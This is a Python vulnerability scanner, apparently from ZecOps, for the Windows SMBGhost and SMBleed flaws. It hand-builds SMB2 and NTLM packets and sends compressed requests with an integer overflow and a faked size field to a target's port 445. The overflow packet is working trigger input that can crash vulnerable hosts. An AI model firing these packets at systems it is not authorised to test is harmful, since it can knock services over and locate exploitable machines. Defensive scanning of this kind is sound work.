# SMBGhost (CVE-2020-0796) and SMBleed (CVE-2020-1206) Scanner
# (c) 2020 ZecOps, Inc. - https://www.zecops.com - Find Attackers' Mistakes
# Intended only for educational and testing in corporate environments.
# ZecOps takes no responsibility for the code, use at your own risk.

import socket, struct, sys, copy

class Smb2Header:
    def __init__(self, command, message_id=0, session_id=0):
        self.protocol_id = b"\xfeSMB"
        self.structure_size = b"\x40\x00"  # Must be set to 0x40
        self.credit_charge = b"\x00"*2
        self.channel_sequence = b"\x00"*2
        self.channel_reserved = b"\x00"*2
        self.command = struct.pack('<H', command)
        self.credits_requested = b"\x00"*2  # Number of credits requested / granted
        self.flags = b"\x00"*4
        self.chain_offset = b"\x00"*4  # Points to next message
        self.message_id = struct.pack('<Q', message_id)
        self.reserved = b"\x00"*4
        self.tree_id = b"\x00"*4  # Changes for some commands
        self.session_id = struct.pack('<Q', session_id)
        self.signature = b"\x00"*16

    def get_packet(self):
        return self.protocol_id + self.structure_size + self.credit_charge + self.channel_sequence + self.channel_reserved + self.command + self.credits_requested + self.flags + self.chain_offset + self.message_id + self.reserved + self.tree_id + self.session_id + self.signature

class Smb2NegotiateRequest:
    def __init__(self):
        self.header = Smb2Header(0)
        self.structure_size = b"\x24\x00"
        self.dialect_count = b"\x08\x00"  # 8 dialects
        self.security_mode = b"\x00"*2
        self.reserved = b"\x00"*2
        self.capabilities = b"\x7f\x00\x00\x00"
        self.guid = b"\x01\x02\xab\xcd"*4
        self.negotiate_context = b"\x78\x00"
        self.additional_padding = b"\x00"*2
        self.negotiate_context_count = b"\x02\x00"  # 2 Contexts
        self.reserved_2 = b"\x00"*2
        self.dialects = b"\x02\x02" + b"\x10\x02" + b"\x22\x02" + b"\x24\x02" + b"\x00\x03" + b"\x02\x03" + b"\x10\x03" + b"\x11\x03"  # SMB 2.0.2, 2.1, 2.2.2, 2.2.3, 3.0, 3.0.2, 3.1.0, 3.1.1
        self.padding = b"\x00"*4

    def context(self, type, length):
        data_length = length
        reserved = b"\x00"*4
        return type + data_length + reserved

    def preauth_context(self):
        hash_algorithm_count = b"\x01\x00"  # 1 hash algorithm
        salt_length = b"\x20\x00"
        hash_algorithm = b"\x01\x00"  # SHA512
        salt = b"\x00"*32
        pad = b"\x00"*2
        length = b"\x26\x00"
        context_header = self.context(b"\x01\x00", length)
        return context_header + hash_algorithm_count + salt_length + hash_algorithm + salt + pad

    def compression_context(self):
        #compression_algorithm_count = b"\x03\x00"  # 3 Compression algorithms
        compression_algorithm_count = b"\x01\x00"
        padding = b"\x00"*2
        flags = b"\x01\x00\x00\x00"
        #algorithms = b"\x01\x00" + b"\x02\x00" + b"\x03\x00"  # LZNT1 + LZ77 + LZ77+Huffman
        algorithms = b"\x01\x00"
        #length = b"\x0e\x00"
        length = b"\x0a\x00"
        context_header = self.context(b"\x03\x00", length)
        return context_header + compression_algorithm_count + padding + flags + algorithms

    def get_packet(self):
        padding = b"\x00"*8
        return self.header.get_packet() + self.structure_size + self.dialect_count + self.security_mode + self.reserved + self.capabilities + self.guid + self.negotiate_context + self.additional_padding + self.negotiate_context_count + self.reserved_2 + self.dialects + self.padding + self.preauth_context() + self.compression_context() + padding

class NetBIOSWrapper:
    def __init__(self, data):
        self.session = b"\x00"
        self.length = struct.pack('>i', len(data))[1:]
        self.data = data

    def get_packet(self):
        return self.session + self.length + self.data

class Smb2CompressedTransformHeader:
    def __init__(self, data, offset, original_decompressed_size):
        self.data = data
        self.protocol_id = b"\xfcSMB"
        self.original_decompressed_size = struct.pack('<i', original_decompressed_size)
        self.compression_algorithm = b"\x01\x00"
        self.flags = b"\x00"*2
        self.offset = struct.pack('<i', offset)

    def get_packet(self):
        return self.protocol_id + self.original_decompressed_size + self.compression_algorithm + self.flags + self.offset + self.data

class Smb2SessionSetupRequest:
    def __init__(self, message_id, buffer, session_id=0, padding=b''):
        self.header = Smb2Header(1, message_id, session_id)
        self.structure_size = b"\x19\x00"
        self.flags = b"\x00"
        self.security_mode = b"\x02"
        self.capabilities = b"\x00"*4
        self.channel = b"\x00"*4
        self.security_buffer_offset = struct.pack('<H', 0x58 + len(padding))
        self.security_buffer_length = struct.pack('<H', len(buffer))
        self.previous_session_id = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        self.padding = padding
        self.buffer = buffer

    def get_packet(self):
        return (self.header.get_packet() +
            self.structure_size +
            self.flags +
            self.security_mode +
            self.capabilities +
            self.channel +
            self.security_buffer_offset +
            self.security_buffer_length +
            self.previous_session_id +
            self.padding +
            self.buffer)

class Smb2NtlmNegotiate:
    def __init__(self):
        self.signature = b"NTLMSSP\x00"
        self.message_type = b"\x01\x00\x00\x00"
        self.negotiate_flags = b"\x32\x90\x88\xe2"
        self.domain_name_len = b"\x00\x00"
        self.domain_name_max_len = b"\x00\x00"
        self.domain_name_buffer_offset = b"\x28\x00\x00\x00"
        self.workstation_len = b"\x00\x00"
        self.workstation_max_len = b"\x00\x00"
        self.workstation_buffer_offset = b"\x28\x00\x00\x00"
        self.version = b"\x06\x01\xb1\x1d\x00\x00\x00\x0f"
        self.payload_domain_name = b""
        self.payload_workstation = b""

    def get_packet(self):
        return (self.signature +
            self.message_type +
            self.negotiate_flags +
            self.domain_name_len +
            self.domain_name_max_len +
            self.domain_name_buffer_offset +
            self.workstation_len +
            self.workstation_max_len +
            self.workstation_buffer_offset +
            self.version +
            self.payload_domain_name +
            self.payload_workstation)

# Source:
# https://github.com/you0708/lznt1/blob/8ac366bb34d06ed867c71aad37ace7d95ceae198/lznt1.py
def compress(buf, chunk_size=0x1000):
    def _find(src, target, max_len):
        result_offset = 0
        result_length = 0
        for i in range(1, max_len):
            offset = src.rfind(target[:i])
            if offset == -1:
                break
            tmp_offset = len(src) - offset
            tmp_length = i
            if tmp_offset == tmp_length:
                tmp = src[offset:] * int(0xFFF / len(src[offset:]) + 1)
                for j in range(i, max_len+1):
                    offset = tmp.rfind(target[:j])
                    if offset == -1:
                        break
                    tmp_length = j
            if tmp_length > result_length:
                result_offset = tmp_offset
                result_length = tmp_length

        if result_length < 3:
            return 0, 0
        return result_offset, result_length

    def _compress_chunk(chunk):
        blob = copy.copy(chunk)
        out = bytes()
        pow2 = 0x10
        l_mask3 = 0x1002
        o_shift = 12
        while len(blob) > 0:
            bits = 0
            tmp = bytes()
            for i in range(8):
                bits >>= 1
                while pow2 < (len(chunk) - len(blob)):
                    pow2 <<= 1
                    l_mask3 = (l_mask3 >> 1) + 1
                    o_shift -= 1
                if len(blob) < l_mask3:
                    max_len = len(blob)
                else:
                    max_len = l_mask3

                offset, length = _find(chunk[:len(chunk) - len(blob)], blob, max_len)

                # try to find more compressed pattern
                offset2, length2 = _find(chunk[:len(chunk) - len(blob)+1], blob[1:], max_len)
                if length < length2:
                    length = 0

                if length > 0:
                    symbol = ((offset-1) << o_shift) | (length - 3)
                    tmp += struct.pack('<H', symbol)
                    bits |= 0x80 # set the highest bit
                    blob = blob[length:]
                else:
                    tmp += blob[0:1]
                    blob = blob[1:]
                if len(blob) == 0:
                    break

            out += struct.pack('B', bits >> (7 - i))
            out += tmp

        return out

    out = bytes()
    while buf:
        chunk = buf[:chunk_size]
        compressed = _compress_chunk(chunk)
        if len(compressed) < len(chunk): # chunk is compressed
            flags = 0xB000
            header = struct.pack('<H' , flags|(len(compressed)-1))
            out += header + compressed
        else:
            flags = 0x3000
            header = struct.pack('<H' , flags|(len(chunk)-1))
            out += header + chunk
        buf = buf[chunk_size:]

    return out

def send_raw(sock, data):
    packet = NetBIOSWrapper(data).get_packet()
    sock.send(packet)
    reply_size = sock.recv(4)
    return sock.recv(struct.unpack('>I', reply_size)[0])

def send_negotiation(sock):
    negotiate = Smb2NegotiateRequest().get_packet()
    return send_raw(sock, negotiate)

def send_compressed(sock, data, offset, original_decompressed_size):
    compressed = Smb2CompressedTransformHeader(data, offset, original_decompressed_size).get_packet()
    return send_raw(sock, compressed)

def connect_and_send_compressed(ip_address, data, offset, original_decompressed_size):
    with socket.socket(socket.AF_INET) as sock:
        sock.settimeout(3)
        sock.connect((ip_address, 445))
        send_negotiation(sock)
        return send_compressed(sock, data, offset, original_decompressed_size)

def connect_and_send_raw(ip_address, data):
    with socket.socket(socket.AF_INET) as sock:
        sock.settimeout(3)
        sock.connect((ip_address, 445))
        send_negotiation(sock)
        return send_raw(sock, data)

def test_uncompressed(ip_address):
    ntlm_negotiate = Smb2NtlmNegotiate().get_packet()
    session_setup = Smb2SessionSetupRequest(1, ntlm_negotiate).get_packet()
    return connect_and_send_raw(ip_address, session_setup)

def test_compressed_benign(ip_address):
    ntlm_negotiate = Smb2NtlmNegotiate().get_packet()
    session_setup = Smb2SessionSetupRequest(1, ntlm_negotiate).get_packet()
    return connect_and_send_compressed(ip_address, compress(session_setup), 0, len(session_setup))

def test_compressed_smbghost(ip_address):
    ntlm_negotiate = Smb2NtlmNegotiate().get_packet()
    session_setup = Smb2SessionSetupRequest(1, ntlm_negotiate).get_packet()
    return connect_and_send_compressed(ip_address, session_setup + b'\x00'*16, len(session_setup), -1)

def test_compressed_smbleed(ip_address):
    ntlm_negotiate = Smb2NtlmNegotiate().get_packet()
    session_setup = Smb2SessionSetupRequest(1, ntlm_negotiate).get_packet()
    return connect_and_send_compressed(ip_address, compress(session_setup), 0, len(session_setup) + 1)

def scan(ip_address):
    print('[+] Sending benign uncompressed SMB packet...')
    try:
        test_uncompressed(ip_address)
    except Exception as e:
        print('[!] ' + str(e).capitalize())
        return 'SMB is inaccessible via target IP, make sure the IP address is correct and check your firewall'

    print('[+] Sending benign compressed SMB packet...')
    try:
        test_compressed_benign(ip_address)
    except Exception as e:
        print('[!] ' + str(e).capitalize())

        print('[+] Sending another benign uncompressed SMB packet...')
        try:
            test_uncompressed(ip_address)
            return 'SMB compression is disabled or not supported, target is not vulnerable'
        except Exception as e:
            print('[!] ' + str(e).capitalize())
            return ('Target no longer accessible, probably a buggy Windows 10 1903 version, '
                'VULNERABLE to SMBGhost (CVE-2020-0796) and SMBleed (CVE-2020-1206)')

    print('[+] Sending compressed SMB packet with integer overflow...')
    try:
        test_compressed_smbghost(ip_address)
        return 'Packet wasn\'t discarded, target is VULNERABLE to SMBGhost (CVE-2020-0796) and SMBleed (CVE-2020-1206)'
    except Exception as e:
        print('[!] ' + str(e).capitalize())

    print('[+] Sending compressed SMB packet with fake data size...')
    try:
        test_compressed_smbleed(ip_address)
        return 'Packet wasn\'t discarded, target is VULNERABLE to SMBleed (CVE-2020-1206)'
    except Exception as e:
        print('[!] ' + str(e).capitalize())

    return 'Target is not vulnerable'

#if __name__ == "__main__":
#print('SMBGhost (CVE-2020-0796) and SMBleed (CVE-2020-1206) Scanner')
#print('(c) 2020 ZecOps, Inc.')
#print()

#if len(sys.argv) != 2:
	#exit('Usage: {sys.argv[0]} target_ip')

target_ip = sys.argv[1]
verdict = scan(target_ip)

print()
print('Verdict: ' + verdict)
